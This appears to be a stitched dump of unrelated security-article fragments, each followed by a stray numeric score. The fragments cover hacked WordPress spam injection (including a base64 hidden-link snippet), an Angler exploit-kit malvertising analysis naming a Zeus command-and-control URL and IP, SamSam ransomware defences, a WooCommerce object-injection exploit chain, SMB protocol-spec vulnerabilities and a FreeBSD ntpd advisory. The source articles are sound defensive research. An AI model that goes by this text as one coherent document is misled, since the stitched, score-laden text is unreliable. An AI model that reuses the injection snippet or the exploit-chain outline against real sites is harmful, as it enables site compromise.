What may such code look like? Here’s an example:",0.010077966874047273
"It may not be terribly obvious but certain signs such as the detection of search engines, the use of base64 encoding should be raising some red flags.
This Base64 snippet:
PGRpdiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7dG9wOi0xNDg4cHg7Ij48YSBocmVmPSJodHRwOi8vdGhlcGlyYXRlYmF5LmluLnVhIj5waXJhdGViYXkscGlyYXRlIGJheSxwaXJhdGUsYmF5LHRvcnJlbnRzLGZyZWUsZnJlZSBzb2Z0d2FyZSxzb2Z0d2FyZSx0b3JyZW50cyxmcmVlIHRvcnJlbnRzLGZyZWUgcG9ybixwb3JuIHRvcnJlbnRzLHRvcnJlbnQ8L2E+PC9kaXY+
turns into",0.016266969356599548
"Again, the code on your server may very well vary but this gives you an idea of what to look for. If you aren’t sure about this, you can scan your site with Sucuri’s free sitecheck which may also identify vulnerabilities:",0.009652480656256568
"For example, the above WordPress site was running an outdated version of the RevSlider plugin. Late last year, Sucuri exposed a massive campaign of WordPress compromises dubbed “SoakSoak” through a RevSlider vulnerability.
It’s possible this latest wave of attacks is somehow connected with the “SoakSoak” campaign and its authors, although it is too early to tell at this point.
To avoid getting their sites hacked, WordPress users need to check that they are running the latest WP install and that all their plugins are up to date. Other proper hygiene tips such as strong passwords and avoiding public wifi when logging into your site should also be applied.
",0.013991181032259492
"Malvertising campaign on popular site leads to Silverlight exploit, Zeus Trojan
Malicious ads displayed on legitimate websites (malvertising) are something we see a lot of these days.
Website owners have grown to have a love/hate relationship with adverts because on the one hand advertising they are a substantial source of revenues but on the other they are often cause for a lot of troubles.
Site owners use a multitude of different third-party providers which they have trusted over time. However, third-party content is always a bit iffy because you just can’t control it.
Case in point, a popular website recently suffered a malvertising attack. Our honeypots detected the malicious redirection from a compromised ad in the wee hours of last Friday morning.
We contacted both the site owners and the advertising agency and the malicious traffic stopped shortly after.
Over the course of the weekend and the beginning of the week, we exchanged some further emails to get a better understanding about the attack, which turned out to be an Ad server compromise (more details later).
On Monday, Cisco published a blog post about what they said was a wider use of Microsoft Silverlight for exploitation, in particular with the Angler exploit kit.
The use of Silverlight in exploit kits and its preference to other plugins (or not) isn’t the point of this article. We will mainly try to study a particular attack and provide some technical details.
We hope the information can help out both site owners, advertisers and the general public in better understanding the malvertising threat and how to mitigate it.
Stage 1: Ad server redirection
Figure 1: HTTP traffic showing malvertising attack.
In this example the redirection process was very straightforward: legitimate website -> ad server -> malicious website.
Figure 2: Compromised ad server redirects to malicious URL.
The goal of this malvertising attack is to redirect unsuspecting users to an exploit kit landing page in order to infect their computers.
Stage 2: Drive-by download through Angler exploit kit
The exploit kit landing page is heavily obfuscated to make detection harder.
Figure 3: Angler exploit kit landing page (encoded variables)
There are also several JavaScript bits all over the place:
Figure 4: Angler exploit kit landing page (JavaScript)
Reconstructing the page to see what code is actually there could be a painful and lengthy process. But in this case, I decided to do it the easy way and started to look for an ‘eval’.
Figure 5: eval statement holds the key to page’s source code.
The eval statement will contain a value for a particular variable MDc4Pa used throughout the code. What I did was simply print its content by relying on the browser itself to do the heavy lifting (decoding the page):
function deobfuscate() {
var code = prompt(“Deobfuscated code:”,MDv4Pa);
}
deobfuscate();
This is a very basic function that will display a prompt in the browser window containing the variable we are interested in (it replaces the eval):
Figure 6: Printing obfuscated code for review.
Now all we have to do is copy and paste the values into a text editing program and review the code in clear.
Since the code is actually fairly long, we will only focus on certain interesting parts. As with most exploit kit landing pages, this one also attempts to profile the victim’s computer (browser name and version, Java, Flash, Silverlight versions etc…):
Figure 7: Code used to detect non IE browsers.
Following detection, various exploit modules will be loaded to exploit the user’s configuration.
There are interesting and funny bits of code within this Angler landing page worth pointing out. First one is a check for a particular file name on the user’s machine called kl1.sys:
Figure 8: Kaspersky network driver on the system? No exploit for you.
It turns out that this file is a Kaspersky network driver. If the file is present on the system, several variables will be assigned a value of false, which, as we will see later, make it so that the exploit code is never triggered.
There is also a possible voluntary (or not?) typo in the code:
Figure 9: Typo or not?
And finally, a tongue-in-cheek poke at security researcher Kafeine (cf April Fish):
Figure 10: The impossible path.
In this particular malvertising case, a Microsoft Silverlight (use Netflix on your PC?) was used. We will spend some time analyzing it in more detail.
To prepare the exploit, the following code assesses what version of Silverlight is running:
Figure 11: Checking Silverlight and other conditions before firing the exploit.
Also, you can see that last line checking if a variable is true. This is the same variable (one of them) that was used earlier to detect if the user was running Kaspersky.
Then, another piece of code prepares the URL from where the exploit will be served:
Figure 12: Preparing the Silverlight exploit URL.
Finally, the Silverlight PK is retrieved from the malicious server. Note the full URL and its parameters which were defined above:
Figure 13: GET request for malicious Silverlight file.
The PK file can be extracted and contains a .DLL (aVbtTTscsC.dll) defined in the AppManifest file:
Figure 14: Content of the Silverlight package.
aVbtTTscsC.dll is a typical binary with section headers:
Figure 15: Section headers for Silverlight exploit.
We won’t dig any further into the Silveright exploit. If you are interested to know more, I suggest you read this post by Kafeine: CVE-2013-0074/3896 (Silverlight) integrates Exploit Kits.
Stage 3: The payload, a Zeus banking Trojan
Following successful exploitation of the machine, a payload is dropped. This one is none other than the infamous Zeus/Zbot banking Trojan which we blogged about a few months back.
Let’s take a look at this one:
Figure 16: File info courtesy of malwr.com.
Upon execution, the sample talks to a backend command and control server:
http://macnewsonline . pw/yxg4z3vh/gate_ywa2wiq9.php
Figure 17: Connection to C2 server.
It also makes a request to another domain, a Pony Loader: http://{redacted}.eu/gate.php (hiding behind CloudFlare’s infrastructure):
Figure 18: Connection to a Pony loader server.
Figure 19: Pony admin login page.
There’s also another notable external connection to an IP (37.57.26.167) based in the Ukraine:
Figure 20: Geolocation for botnet related activity (picture courtesy of IPligence).
which has had botnet related activity in the past little while:
Figure 21: Botnet activity (details courtesy of VirusTotal).
Web site owners (publishers and advertisers)
You could have the most secure website in the world and yet still be affected by malvertising. Part of the problem is due to external factors involved with advertising.
If like most companies you rely on third-party ad providers, your security is as good as theirs or that of their own suppliers.
Carefully selecting who you do business with goes a long way, but even so, malvertising can be very sneaky and come back to haunt you.
To give you an example, even if you carefully inspect every ad prior it went online, the bad guys have devised a way to activate their campaigns at particular times, or based on geographic zones. So a benign ad could easily turn into a malicious one later.
Having said that, there are several guidelines to improve safety are still very valuable. You can read more here.
Lastly, and perhaps more importantly, website owners can really benefit from an online monitoring service that checks their site at regular intervals. While there is no 100% guarantee in your site never getting hacked or suffering from malvertising, your degree of reactivity to a problem can make a big difference.
After all, your brand and reputation are at stake. You may not land on a blacklist but there is little worse to scare your visitors away than your spreading malware.
End users: multi-layer protection
The best defence is a layered one and it starts with browser protection. To stop the Silverlight exploit you need to be running the latest version of the software. What if you weren’t?
Malwarebytes Anti-Exploit BETA already blocks this type of exploit. Even a one year old version of Anti-Exploit (version 0.09.2.1100) already mitigated Silverlight exploits (CVE-2013-3896 and CVE-2013-0074):",0.018800584789982144
"For good measure, here’s the latest version of Malwarebytes Anti-Exploit:
Figure 21: Silverlight exploit (version 5.1.10411.0, prompts for update after exploitation attempt).
Of course, good Anti-Malware protection running in the background can also protect you against the threat, either by blocking the malicious site or the dropped payload.
Malwarebytes Anti-Malware detects the malvertising payload as Spyware.Zbot.VXGen:
Figure 22: Malwarebytes Anti-Malware showing detection for Zeus/Zbot Trojan.
Files of interest (for security researchers):",0.012390184203126431
"Obfuscated Angler EK landing
Deobfuscated Angler EK landing
Silverlight exploit
Payload",0.011522720893789473
"@jeromesegura
",0.011896365074086979
"Last week Adobe released the APSB12-17 Flash Player update. The update patches two critical security flaws — CVE-2012-0772 and CVE-2012-0773 — in the Adobe Flash player, and also, for the first time ever, introduces auto-patching mechanism. The update affects the following operating systems – Windows, Mac OS X, Linux and Solaris.",0.011725071693207578
More details:,0.008320251094065867
"By default, all users are opted-out of the auto-patching mechanism. Webroot highly recommends that users opt-in, and start taking advantage of the feature in order to ensure that the latest security updates are automatically pushed by Adobe in a timely manner. For the time being, the feature is only available to Windows users.
End and corporate users can download the latest version of the Adobe Flash Player from this web site. Users of Google’s Chrome, which includes the Flash Player plugin by default, can take advantage of the latest Flash Player update, in Chrome’s latest update, version 18.0.1025.142.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.012944833452827154
PRODUCTS & SERVICES,0.010734820384793453
Shutting out SamSam ransomware,0.012140382276613182
4 simple tips for improving your protection against targeted ransomware,0.010489850099865472
"Written by
Editor",0.007990427730288352
"May 02, 2018",0.008664642303525039
Malware Products & Services Ransomware samsam,0.010241874304469212
"Since this article was written Sophos has published extensive new research on SamSam in its new paper SamSam the (almost) six million dollar ransomware. A summary of our most up to date protection advice was released alongside it on our sister site Naked Security.
Although most of the damage inflicted by ransomware is done in untargeted, scattergun attacks using software like Locky and GlobaImposter, devastating, sniper-like targeted attacks are on the rise.
In a targeted attack crooks select a vulnerable organisation and tailor their approach to cause maximum damage and disruption. Working in this way, the crooks are able to minimise their exposure while extorting high ransoms.
A popular tool for hackers working in this way is SamSam ransomware, also known as Samas.
SamSam attacks are relatively rare and seem to be focussed on the healthcare, government and education sectors. No two attacks are the same although there are common elements between them. The SamSam software configuration and ransom demands vary from one victim to the next and ransom demands are as high as $60,000.
The bitcoin addresses associated with SamSam have received over $1 million in ransom payments just this year.
Because of the nature of the attacks, precise details are scarce. SophosLabs has been investigating the recent attacks and have discovered new information about how the ransomware has evolved over the last few months. For more details on this please see our whitepaper SamSam ransomware chooses its targets carefully.
Staying protected
Although the hackers’ approach varies from target to target, preying on their specific weaknesses, there are common threads that are worth paying particular attention to.
1. Lock the door
SamSam attacks often start with the attackers exploitingweak passwords on RDP accounts, so:",0.020364998040078852
"If you don’t need RDP, turn it off.
Make sure users have strong passwords.
Enable two-factor authentication (2FA) wherever you can.
Only accept RDP connections from authorised computers.
Set a lockout policy to limit the rate at which passwords can be tried.",0.014830357693143115
"2. Fix any leaks
The SamSam attackers are also thought to have gained entry to targets’ networks by exploiting Java deserialisation vulnerabilities and unpatched JBoss systems, using vulnerabilities such as: CVE-2010-0738, CVE-2012-0874 and CVE-2010-1428.
Of course it’s sensible to assume that the SamSam hackers will exploit any public-facing vulnerability that serves their purposes so this isn’t an exclusive list – the usual advice about staying on top of your patching applies.
3. Keep things clean and tidy
If an attacker gains access to your network then stopping the attack is rarely a simple matter of detecting a single, obviously malicious file. Many of the tools used in SamSam attacks are used precisely because they’re legitimate pieces of software that are already on your network, such as PsExec, Powershell, WScript or CScript.
If you’re a Sophos customer you can use Application Control to configure your organisation’s access to legitimate applications, ensuring, for example, that the admins who need Powershell have access to it and normal users don’t.
SamSam has been seen using PsExec to help it spread across networks. By default PsExec is detected by our products as a Potentially Unwanted Application (PUA) and will be blocked.
Admins should make sure they have PUA scanning enabled and that PsExec hasn’t been added to the authorised list. If you need to use PsExec you can authorise it for just the users who need it and then revoke that authorisation when you’re done.
4. Get a good guard dog (or two)
Each layer of security you have is designed for a different type of threat and a strategy of defence in depth that employs multiple, overlapping layers of protection is, as ever, the best approach.
Sophos Endpoint and Server blocks current versions of SamSam as Troj/Samas-F, Troj/RansRun-A and Mal/Kryptik-BV.
Customers with Intercept X or Exploit Prevention are protected against SamSam by our anti-ransomware protection CryptoGuard.
For customers with Central Server Advanced licenses, Server Lockdown (allowlisting) can be deployed to harden your servers against unauthorized changes.
Customers using Sophos Central in combination with the XG Firewall, can use the Security Heartbeat™ feature, which enables your endpoints to communicate with your firewall, to create policies that automatically isolate a machine if a detection is reported, quickly containing any threat.",0.017583440269668293
DEEP LEARNING FOR DEEPER CYBERSECURITY  Watch Video,0.011176153783902576
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Security Advisory: Object Injection Vulnerability in WooCommerce
Security Risk: DangerousExploitation Level: Easy/RemoteDREAD Score: 8/10Vulnerability: Object InjectionPatched Version: 2.3.11
During a routine audit for our WAF, we discovered a dangerous Object Injection vulnerability in WooCommerce which could, in certain contexts, be used by an attacker to download any file on the vulnerable server.
Are You At Risk?
The vulnerability is only present when WooCommerce’s “PayPal Identity Token” option is set. If it is, your site is vulnerable to an Object Injection type of vulnerability, which essentially means that depending on the context the site is running in, it may be used to do a variety of things. We managed to use a combination of WordPress and WooCommerce components with a known PHP bug (CVE-2013-1643) to download critical files, files like wp-config.php; for those unfamiliar, this file contains the database credentials and WordPress secret keys. As seen in the past, giving an attacker access to these files usually results in full site compromise.",0.007717166030644762
"It is worth noting that even if your site doesn’t run on top of an old version of PHP a lot of different attack vectors an attacker could be used depending on what extensions you have available. There’s also a couple other bugs related to PHP itself that we could have investigated, but we decided to stick with CVE-2013-1643 because it’s widely documented and relatively simple to recreate.
Technical Details
Everything begins in the get_paypal_order method of the WC_Gateway_Paypal_Response class.
The get_paypal_order method",0.00618688111373511
"The $custom function parameter is directly passed to WordPress function maybe_unserialize(), which can be used in Object Injection attacks when ran with direct user input.
The check_response method",0.009315760833799036
"As you can see from the above snippet, the get_paypal_order method is used with a variables tainted by $_REQUEST[‘cm’] – anyone accessing the page where this code gets executed (when someone visits the plugin’s order-received page with some very specific parameters set) can use this vector to spawn arbitrary class instances and potentially modify the application’s execution flow (depending on what classes are available in the current context).
Because this type of vulnerability requires very specific conditions to be exploited, we decided to give it a try and create a Proof of Concept to demonstrate how a malicious individual could use this vulnerability, along with CVE-2013-1643, to leak WordPress configuration file wp-config.php.
Leaking files
Some of you might already have noticed, the CVE mentioned earlier refers to some SOAP/XML issues, nothing related to unserialize() or Object Injection as a whole. The trick lays in the fact that this particular bug affects a few PHP mechanisms, including the SoapClient class. What makes this particular class interesting is the fact it contains a __call magic method that makes it possible to submit a SOAP request to any server and parse the resulting XML making it possible to conduct XXE attacks and download files from the server.
In order to trigger the __call method, we needed to find a place in the code where we could force our unserialized object to call a method that doesn’t exist in the original class definition, thus forcing the magic method to trigger. We found what we were searching for in WordPress PHPMailer class, specifically in the smtpClose() method.
PHPMailer’s smtpClose method",0.01064260518448723
"In this scenario, we would unserialize a PHPMailer class whose smtp variable would contain a carefully crafted SoapClient instance to trigger the XXE part of the exploit. That’s good in theory, but we needed to find a way to call this method.
PHPMailer’s __destruct method
.. we got lucky!
The PHPMailer class also contained a destructor that calls the smtpClose() method! This means that all we’d need to do to get the __call magic method to execute is to initiate a PHPMailer class that has the Mailer variable set to “smtp”; PHP would call the necessary methods when the current script’s execution ends.
Last but not least, we’d need  the PHPMailer class to be present in the application context when our serialized payload hits the maybe_unserialize() call, which isn’t the case by default. Generally speaking, this class is included when WordPress uses the wp_mail() function, so we had to find a place where we could force WooCommerce to send an email before our serialized payload gets unserialized.
Hooking the process_lost_password function",0.010722056793183055
"The process_lost_password functio
WooCommerce allows users to reset their account’s lost password, a process that requires sending an email, exactly what the hackers want! Plus, this function is hooked very early in the WordPress boot sequence, which is perfect because it makes the PHPMailer class available for unserialization.
Update as Soon as Possible
If you’re using a vulnerable version of this plugin, update as soon as possible! In the event where you can not do this, we strongly recommend leveraging our Website Firewall or equivalent technology to get it patched virtually.
",0.009508434326209958
"A new trend in exploitation
2011-08-01",0.011292995452951815
"Abhishek Singh
Alert Logic
,
USA",0.009115487064009109
"Johnathan Norman
Alert Logic
,
USA
Editor:
Helen",0.009503996472236098
"Martin
Abstract
Recently, a new type of exploitation technique has been observed that makes use of improper implementation of protocol specifications. This type of exploitation requires a different type of analysis from the more traditional classes of exploitation. Abhishek Singh and Johnathan Norman explain why.
Copyright © 2011 Virus Bulletin",0.011239302714756927
"Understanding the exploitation of a vulnerability is important both for product security teams and for the research teams that generate signatures for network intrusion prevention/detection (NIS) devices.
Product security teams need to gain an understanding of the vulnerable part of the code and provide an update, or patch, to fix the vulnerability. In order to create a signature for an intrusion prevention/detection device, researchers must gain an understanding of the vulnerability and then derive the conditions that can lead to it being exploited. When deployed, the signature will protect the vulnerable application from being exploited via the network.
In order to develop a signature for traditional types of vulnerabilities such as buffer overflows, format string vulnerabilities and integer overflows, we have to refer to the vulnerable code itself. Once the vulnerable portion of the code has been identified, it can be used to determine the conditions that will lead to its exploitation, and a signature can be generated based on those conditions. Recently, however, we have observed a new type of exploitation technique that makes use of improper implementation of protocol specifications. This type of exploitation requires a different type of analysis.",0.01685598740085159
"What makes this trend different?
Even though improper implementation of protocol specifications can lead to traditional, well-defined classes of exploitation such as integer overflow, buffer overflow, denial of service attacks and remote code execution, exploitations arising in this manner can be classified as a new trend for the following reasons:
Rather than analysing the vulnerable source code to derive the conditions that can be used to create a signature for NIS devices, the proprietary protocol specification document must be consulted. This document states the values for the arguments of a command as well as when and how the values can be used. The NIS signature is created based on the information provided in the documentation.
Traditionally, when testing for security issues, product test teams find a vulnerable function and then generate various inputs for the function to test whether it can be exploited. In the case of vulnerabilities that arise due to the improper implementation of proprietary protocol specifications, test cases must be constructed according to the values set by the protocol specifications and not by the exploitation techniques.
There have been repeated occurrences of exploitations taking advantage of the improper implementation of protocol specifications, as outlined in Table 1.
In the following sections we will present analyses of two of the vulnerabilities listed here, CVE-2011-0654 and CVE-2009-3103, in each case looking first at the source code and then using the protocol specifications to derive the conditions upon which to base an NIS signature.
CVE ID of the vulnerability
Trigger conditions
CVE-2009-3103
Vulnerable condition is triggered due to the improper implementation of the Server Message Block (SMB) command negotiate protocol.
CVE-2009-3676
A denial of service vulnerability exists in
Microsoft",0.010978844149536315
"Windows
’ Server Message Block (SMB) implementation. Specifically, the vulnerability is due to improper parsing of the NetBIOS Length parameter. If the Length field does not match the size of the following SMB message, an infinite loop can result, causing a denial of service condition.
CVE-2010-0270
Vulnerability in improper implementation of the SMB Trans2 response for command type 0x32. If the sum of the values of the ‘Data Count’ and ‘Data Offset’ fields is larger than the total length of the SMB message header and the SMB message data structure, then an attack is underway.
CVE-2010-0477
Vulnerable condition is triggered when the message size is greater than the amount of data.
CVE-2011-0476
Vulnerability in improper implementation of the SMB response with command type =0x25. If the value of the ‘TotalDataCount’ field is larger than the actual length of the message data, the exploit is underway.
CVE-2011-0654
Vulnerable condition is triggered due to the improper implementation of the server name in
Microsoft Windows
Browser Protocol.
Table 1. List of vulnerabilities caused by the improper implementation of protocol specification documents.",0.013199707902069036
"Analysis of MS11-019 CVE-2011-0654
CVE-2011-0654 was a zero-day browser election vulnerability [1]. It exists in the way that the Common Internet File (CIFS) browser protocol implementation [2] parses malformed browser messages. Microsoft has issued a patch for the vulnerability.
Figure 1 shows the packet capture when the exploit code is executed. It is obvious from the capture that the server name is the malicious field and is sending malicious bytes for the exploitation of the vulnerability.
Figure 1. Packet capture for CVE-2009-3103 when malicious bits are sent over the wire.
When an overly long ServerName field is encountered, the code in the _BowserWriteErrorLogEntry function allocates a fixed buffer of size 112 (0x70) bytes to store multiple fields. Once the server name is copied, the remaining buffer size is calculated as:
Remaining_Buffer_Size = 112 – (length (Server_Name)*2)
Hence a ServerName field that is 56 bytes long (including the NULL terminator) would cause the remaining buffer size to be zero.
Figure 2. Figure 2: Vulnerable section of the code.
Later in the code, as shown in Figure 2, the variable v19 is used in memcpy. As shown in Figure 2, v19 is equal to v23>> -1. V23 is the variable Remaining_Buffer_Size. If the variable v23 is decreased by one, v19 being an unsigned integer becomes = 0xFFFFFFFF. The check ‘if (v19)’ becomes true and a large amount of data is copied to memcpy, leading to an overflow. So, from the analysis of the code, it can be inferred that in order to prevent such an overflow the sever name must be less than 56 bytes.
However, if we refer to Microsoft’s protocol specification, it can be seen that the server name must, in fact, be less than 16 bytes and must be null terminated:
‘ServerName (variable): MUST be a null-terminated ASCII server name and MUST be less than or equal to 16 bytes in length, including the null terminator.’ [2]
In this case a signature for an intrusion prevention/detection device can be created that checks the length of the server name in the Browser Election request – a server name that is greater than 16 bytes indicates exploitation of the vulnerability.
From the above analysis it can be seen that referring to the proprietary protocol specification is very important when creating an NIS signature. The document provides the correct values, whereas the analysis of the source code provided a value which would have been incorrect to base an NIS signature upon.",0.015508908580215697
"Analysis of CVE-2009-3103
Let’s look at the analysis of another zero-day vulnerability, CVE-2009-3103. This is triggered due to an array indexing error while parsing SMB packets containing SMB2 dialect with an SMB Negotiate message [3].
In the source code the Process ID High (PIDHigh) value is used, without any bounds checking, to index an array of function pointers. This function pointer is later dereferenced and called for further processing. So, by using the process ID field, an attacker can index into an array of function pointers triggering the vulnerable conditions.
Figure 3. Packet capture for CVE-2009-3103.
The analysis of the code does not provide an authoritative condition that can be used to author an NIS signature. However, if we check the publicly available proprietary protocol specification document for the legitimate values for PIDHigh, it states that for a 16-bit process ID the value must be 0 and for a 32-bit process ID the value is as per the CIFS/1.0 protocol specification:
‘PIDHigh (2 bytes): This field MUST give the 2 high bytes of the process identifier (PID) if the client wants to use 32-bit process IDs, as specified in [CIFS] section 2.4.2. If a client uses 16-bit process IDs, this field MUST be set to zero.’ [4]
Further referring to the CIFS protocol [5], the PIDHigh value is used only in the NtCreateAndX request. The command value of NtCreateAndX is 0xa2. Since the values are used in NtCreateAndX, for the command ‘Negotiate (0x72)’ the value of PIDHigh must be 0.
Hence for network-level inspection devices, it must be assumed that if the value of the SMB command is 0x72, and if the value of PIDHigh is not equal to 0, the bits on the wire are an exploit. Once again, this case demonstrates that if we refer to the protocol specification documents, the conditions used to author an NIS signature can be derived in an authoritative manner.",0.01390183448300264
"Inference drawn
Protocol specifications and/or RFCs generally define the structure of a protocol and the fields that are associated with it. In some cases proprietary protocol specification documents (or RFCs) can also define ‘safe’ values, including when and how these values are used.
The ideal approach to understanding any class of vulnerability is to reverse the code and perform an analysis of the vulnerability and then derive the conditions for a signature. The new trend of exploitations which arise due to the improper implementation of RFC/protocol specifications require a complete change in the thought process of a security researcher while performing the vulnerability analysis. The new trend will force security researchers to refer to protocol specifications, since they might contain the right values to author a signature.
In some cases, such as CVE-2011-0654, analysis of source code alone can lead to incorrect values being included in NIS signatures. In cases such as CVE-2009-3103, source code analysis is not sufficient to determine authoritative conditions for an NIS signature.
For product security testing teams, a complete change in the design of test cases is required. Fuzzing tools will have to be designed in such a way that the tool streams the values enforced by the protocol specifications. If fuzzers use the traditional technique of finding the vulnerable function and generating various inputs to test if it can be exploited, they will miss exploitations due to the improper implementation of protocol specifications.",0.016661824556179705
"Bibliography
[1] http://www.securityfocus.com/bid/46360/exploit.
[2] http://msdn.microsoft.com/en-us/library/cc224428(v=prot.10).aspx.
[3] http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-3103.
[4] http://msdn.microsoft.com/en-us/library/cc246231%28v=PROT.13%29.aspx.
[5] http://www.microsoft.com/about/legal/protocols/BSTD/CIFS/draft-leach-cifs-v1-spec-02.txt.
",0.009492787151756943
"SSL Malvertising Campaign Targets Top Adult Sites
The SSL malvertising campaign we documented in August that affected Yahoo.com, MSN.com and several other top sites is still ongoing. This time around it is striking on adult portals, including top domain xHamster.com which has close to half a billion monthly visits.
What allows us to differentiate it from other malvertising attacks are some similar patterns in the infrastructure, such as the use of free cloud-based platforms providing Secure Sockets Layer (SSL).
We have observed the Microsoft Azure and RedHat cloud platforms and now are seeing IBM’s Bluemix being leveraged by threat actors who enjoy the free HTTPS encryption that it provides them in the delivery of malicious code.The malicious advert – served by TrafficHaus  – was for a dating application called ‘Sex Messenger’ and was displayed often enough that we were able to reliably reproduce the infection in our lab, something that isn’t always feasible when it comes to malvertising.
Several checks are embedded within the ad to verify that the user is genuine and is running Internet Explorer. We notice the use of the XMLDOM vulnerability (CVE-2013-7331) to fingerprint the victim’s system for particular security software, virtualization (Virtual Machines) and the Fiddler web debugger.
These efforts ensure that only real users will get to see the exploit kit landing page therefore excluding honeypots and security researchers alike. It’s noteworthy that those checks – which used to be done at the exploit kit landing page level – are done at the traffic redirection/malvertising stage most likely to avoid unnecessary attention and wasted traffic.
Fortunately, TrafficHaus was quick to stop this malicious campaign. Malwarebytes Anti-Exploit users were already protected against this threat and never saw its payload (ransomware and more).
Update:
A couple of days after reporting the initial attack, we spotted another malvertising incident that this time distributes browser-based ransomware (browlock), also from xHamster.This latest example is a reminder that malvertising does not always equate to malware infections via exploit kits. In fact, a very large portion of malvertising attacks push fraudulent pages (FBI browserlock ransomware, tech support scams, fake surveys, etc) because they can affect all platforms, and especially mobile users.
Those sites are typically harmless but display alarming messages and annoying pop ups preventing users from closing their browser easily. The rest is all about social engineering and “Psychological Warfare” which I discussed recently in a webinar with fellow Malwarenaut Adam Kujawa.
We notified TrafficHaus immediately upon discovery.
",0.012275513837471164
Open Source Vulnerability Disclosure with FreeBSD,0.008541075892540939
Get link,0.00875442411000149
Facebook,0.011690316117642374
Twitter,0.00956892365716755
Pinterest,0.008890873884770167
Email,0.009317642269235038
Other Apps,0.009765233287938546
"September 10, 2009",0.009035712320651146
"The purpose of this post is not to bash Microsoft, but I am going to point out why I prefer relying on open source platforms, especially for sensitive systems.  One of the advantages of the open source model is that anyone can identify and evaluate changes.  This is especially true of open source projects like FreeBSD.  Let's look at a recent security advisory in ntpd to demonstrate what I mean.-----BEGIN PGP SIGNED MESSAGE-----Hash: SHA1=============================================================================FreeBSD-SA-09:11.ntpd                                       Security Advisory                                                          The FreeBSD ProjectTopic:          ntpd stack-based buffer-overflow vulnerabilityCategory:       contribModule:         ntpdAnnounced:      2009-06-10Credits:        Chris RiesAffects:        All supported versions of FreeBSD.Corrected:      2009-06-10 10:31:11 UTC (RELENG_7, 7.2-STABLE)                2009-06-10 10:31:11 UTC (RELENG_7_2, 7.2-RELEASE-p1)                2009-06-10 10:31:11 UTC (RELENG_7_1, 7.1-RELEASE-p6)                2009-06-10 10:31:11 UTC (RELENG_6, 6.4-STABLE)                2009-06-10 10:31:11 UTC (RELENG_6_4, 6.4-RELEASE-p5)                2009-06-10 10:31:11 UTC (RELENG_6_3, 6.3-RELEASE-p11)CVE Name:       CVE-2009-1252For general information regarding FreeBSD Security Advisories,including descriptions of the fields above, security branches, and thefollowing sections, please visit .We very clearly see all affected FreeBSD versions which are not end of life.  I.   BackgroundThe ntpd(8) daemon is an implementation of the Network Time Protocol (NTP)used to synchronize the time of a computer system to a reference timesource.Autokey is a security model for authenticating Network Time Protocol(NTP) servers to clients, using public key cryptography.II.  Problem DescriptionThe ntpd(8) daemon is prone to a stack-based buffer-overflow when it isconfigured to use the 'autokey' security model.III. ImpactThis issue could be exploited to execute arbitrary code in the context ofthe service daemon, or crash the service daemon, causing denial-of-serviceconditions.The Background, Problem Description, and Impact are very clear.IV.  WorkaroundUse IP based restrictions in ntpd(8) itself or in IP firewalls torestrict which systems can send NTP packets to ntpd(8).Note that systems will only be affected if they have the ""autokey"" optionset in /etc/ntp.conf; FreeBSD does not ship with a default ntp.conf file,so will not be affected unless this option has been explicitly enabled bythe system administrator.The workaround is NOT the ""solution.""  Using an IP firewall does not make the FreeBSD ""unaffected.""  The vulnerability is present with or without a firewall.V.   SolutionPerform one of the following:1) Upgrade your vulnerable system to 6-STABLE, or 7-STABLE, or to theRELENG_7_2, RELENG_7_1, RELENG_6_4, or RELENG_6_3 security branchdated after the correction date.2) To patch your present system:The following patches have been verified to apply to FreeBSD 6.3, 6.4,7.1, and 7.2 systems.a) Download the relevant patch from the location below, and verify thedetached PGP signature using your PGP utility.[FreeBSD 6.3]# fetch http://security.FreeBSD.org/patches/SA-09:11/ntpd63.patch# fetch http://security.FreeBSD.org/patches/SA-09:11/ntpd63.patch.asc[FreeBSD 6.4 and 7.x]# fetch http://security.FreeBSD.org/patches/SA-09:11/ntpd.patch# fetch http://security.FreeBSD.org/patches/SA-09:11/ntpd.patch.ascb) Execute the following commands as root:# cd /usr/src# patch < /path/to/patch# cd /usr/src/usr.sbin/ntp/ntpd# make obj && make depend && make && make install# /etc/rc.d/ntpd restartVI.  Correction detailsThe following list contains the revision numbers of each file that wascorrected in FreeBSD.CVS:Branch                                                           Revision  Path- -------------------------------------------------------------------------RELENG_6  src/contrib/ntp/ntpd/ntp_crypto.c                           1.1.1.3.8.3RELENG_6_4  src/UPDATING                                             1.416.2.40.2.9  src/sys/conf/newvers.sh                                  1.69.2.18.2.11  src/contrib/ntp/ntpd/ntp_crypto.c                       1.1.1.3.8.1.2.2RELENG_6_3  src/UPDATING                                            1.416.2.37.2.16  src/sys/conf/newvers.sh                                  1.69.2.15.2.15  src/contrib/ntp/ntpd/ntp_crypto.c                          1.1.1.3.20.2RELENG_7  src/contrib/ntp/ntpd/ntp_crypto.c                          1.1.1.3.18.3RELENG_7_2  src/UPDATING                                             1.507.2.23.2.4  src/sys/conf/newvers.sh                                   1.72.2.11.2.5  src/contrib/ntp/ntpd/ntp_crypto.c                      1.1.1.3.18.2.2.1RELENG_7_1  src/UPDATING                                             1.507.2.13.2.9  src/sys/conf/newvers.sh                                   1.72.2.9.2.10  src/contrib/ntp/ntpd/ntp_crypto.c                      1.1.1.3.18.1.2.2- -------------------------------------------------------------------------Subversion:Branch/path                                                      Revision- -------------------------------------------------------------------------stable/6/                                                         r193893releng/6.4/                                                       r193893releng/6.3/                                                       r193893stable/7/                                                         r193893releng/7.2/                                                       r193893releng/7.1/                                                       r193893- -------------------------------------------------------------------------Administrators and users have multiple options to fix the system.  Not listed is using FreeBSD Update to perform a binary update, which I personally prefer.  Furthermore, using this information, we can determine exactly what the problem is.First, we can download http://security.freebsd.org/patches/SA-09:11/ntpd.patch and see the patch itself in clear text.Second, we can visit the http://www.freebsd.org/cgi/cvsweb.cgi/src/contrib/ntp/ntpd/ntp_crypto.c CVS tree for ntp_crypto.c to find the vulnerable code.  We can then review changes between vulnerable and patched versions ourselves.VII. Referenceshttp://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1252The latest revision of this advisory is available athttp://security.FreeBSD.org/advisories/FreeBSD-SA-09:11.ntpd.asc-----BEGIN PGP SIGNATURE-----Version: GnuPG v1.4.9 